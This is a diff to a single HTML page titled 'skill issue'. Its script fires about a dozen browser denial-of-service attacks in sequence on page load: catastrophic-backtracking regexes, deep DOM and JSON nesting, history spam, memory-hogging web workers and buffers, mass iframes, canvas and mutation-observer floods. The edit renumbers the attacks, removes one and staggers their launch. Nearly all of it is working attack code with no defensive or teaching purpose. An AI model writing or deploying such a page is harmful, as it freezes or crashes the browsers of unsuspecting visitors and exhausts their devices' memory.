@@ -1,16 +1,26 @@
 <!DOCTYPE html>
+<html>
+<head>
 <title>skill issue</title>
 <style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;font-size:12px}</style>
-<body><pre id="o"></pre></body>
-<script>
-const o=document.getElementById('o');
-const log=t=>{o.textContent+=t+'\n'};
-const store=[];
+</head>
+<body>
+<pre id="o">=== SKILL ISSUE ===
 
-// Attack 1: ReDoS - SUPERCHARGED
+Loading...</pre>
+<script>
+// Defer everything to ensure page renders first
+window.onload = function(){
+const o=document.getElementById('o');
+const log=t=>{o.textContent+='\n'+t};
+const store=[];
+const safe=fn=>{try{fn()}catch(e){log('blocked: '+e.message)}};
+
+log('Attacks starting...');
+
+// Attack 1: ReDoS
 function redosBomb(){
-  log('skill issue detected');
-  // Multiple evil patterns running simultaneously
+  log('ReDoS...');
   const patterns = [
     [/^(a+)+$/, 'a'.repeat(26)+'b'],
     [/^(a|aa)+$/, 'a'.repeat(26)+'b'],
@@ -19,7 +29,7 @@ function redosBomb(){
   patterns.forEach(([re,str])=>{try{re.test(str)}catch(e){}});
 }
 
-// Attack 2: Recursive JSON - BIGGER
+// Attack 2: Recursive JSON
 function jsonBomb(){
   log('JSON bomb...');
   for(let k=0;k<5;k++){
@@ -29,7 +39,7 @@ function jsonBomb(){
   }
 }
 
-// Attack 3: DOM depth bomb - DEEPER
+// Attack 3: DOM depth bomb
 function domDepthBomb(){
   log('DOM depth bomb...');
   for(let k=0;k<5;k++){
@@ -48,7 +58,7 @@ function domDepthBomb(){
   }
 }
 
-// Attack 4: Layout thrashing - MORE AGGRESSIVE
+// Attack 4: Layout thrashing
 function layoutBomb(){
   log('Layout thrash...');
   function thrash(){
@@ -65,7 +75,7 @@ function layoutBomb(){
   for(let i=0;i<10;i++)requestAnimationFrame(thrash);
 }
 
-// Attack 5: History bomb - FASTER
+// Attack 5: History bomb
 function historyBomb(){
   log('History bomb...');
   let i=0;
@@ -76,7 +86,7 @@ function historyBomb(){
   for(let k=0;k<5;k++)spam();
 }
 
-// Attack 6: Worker bomb - MORE WORKERS, MORE MEMORY
+// Attack 6: Worker bomb
 function workerBomb(){
   log('Worker bomb...');
   const code=`const a=[];setInterval(()=>{const b=new Uint8Array(100*1024*1024);for(let i=0;i<b.length;i+=4096)b[i]=255;a.push(b)},1);`;
@@ -85,7 +95,7 @@ function workerBomb(){
   }
 }
 
-// Attack 7: Iframe bomb - MORE IFRAMES, HEAVIER CONTENT
+// Attack 7: Iframe bomb
 function iframeBomb(){
   log('Iframe bomb...');
   for(let i=0;i<100;i++){
@@ -96,7 +106,7 @@ function iframeBomb(){
   }
 }
 
-// Attack 8: CSS variable recursion - MORE VARIABLES
+// Attack 8: CSS variable recursion
 function cssVarBomb(){
   log('CSS variable bomb...');
   for(let k=0;k<10;k++){
@@ -109,21 +119,7 @@ function cssVarBomb(){
   }
 }
 
-// Attack 9: Sync XHR - BIGGER PAYLOADS
-function syncXhrBomb(){
-  log('Sync XHR bomb...');
-  function spam(){
-    try{
-      const xhr=new XMLHttpRequest();
-      xhr.open('GET','data:text/plain,'+encodeURIComponent('x'.repeat(5000000)),false);
-      xhr.send();
-    }catch(e){}
-    setTimeout(spam,0);
-  }
-  for(let i=0;i<5;i++)spam();
-}
-
-// Attack 10: Mutation observer - EXPONENTIAL GROWTH
+// Attack 9: Mutation observer
 function mutationBomb(){
   log('Mutation bomb...');
   const observer=new MutationObserver(muts=>{
@@ -139,7 +135,7 @@ function mutationBomb(){
   for(let i=0;i<500;i++)document.body.appendChild(document.createElement('span'));
 }
 
-// Attack 11: Canvas bomb
+// Attack 10: Canvas bomb
 function canvasBomb(){
   log('Canvas bomb...');
   for(let i=0;i<30;i++){
@@ -153,14 +149,14 @@ function canvasBomb(){
   }
 }
 
-// Attack 12: String bomb
+// Attack 11: String bomb
 function stringBomb(){
   log('String bomb...');
   let s='x';
   for(let i=0;i<28;i++){s+=s;store.push(s)}
 }
 
-// Attack 13: ArrayBuffer bomb
+// Attack 12: ArrayBuffer bomb
 function arrayBomb(){
   log('ArrayBuffer bomb...');
   for(let i=0;i<50;i++){
@@ -170,15 +166,8 @@ function arrayBomb(){
   }
 }
 
-// UNLEASH HELL
-log('=== SKILL ISSUE ===\n');
-
-// Wrap each attack so failures don't stop the chain
-const safe=(fn)=>{try{fn()}catch(e){}};
-
-// All attacks fire rapidly
-setTimeout(()=>safe(workerBomb),0);
-setTimeout(()=>safe(iframeBomb),10);
+// Staggered launch
+setTimeout(()=>safe(iframeBomb),0);
 setTimeout(()=>safe(canvasBomb),50);
 setTimeout(()=>safe(arrayBomb),100);
 setTimeout(()=>safe(stringBomb),150);
@@ -188,9 +177,13 @@ setTimeout(()=>safe(historyBomb),300);
 setTimeout(()=>safe(layoutBomb),350);
 setTimeout(()=>safe(mutationBomb),400);
 setTimeout(()=>safe(jsonBomb),450);
-setTimeout(()=>safe(syncXhrBomb),500);
+setTimeout(()=>safe(workerBomb),500);
 setTimeout(()=>{
   log('\n=== FINAL BLOW ===');
   safe(redosBomb);
 },600);
+
+};
 </script>
+</body>
+</html>
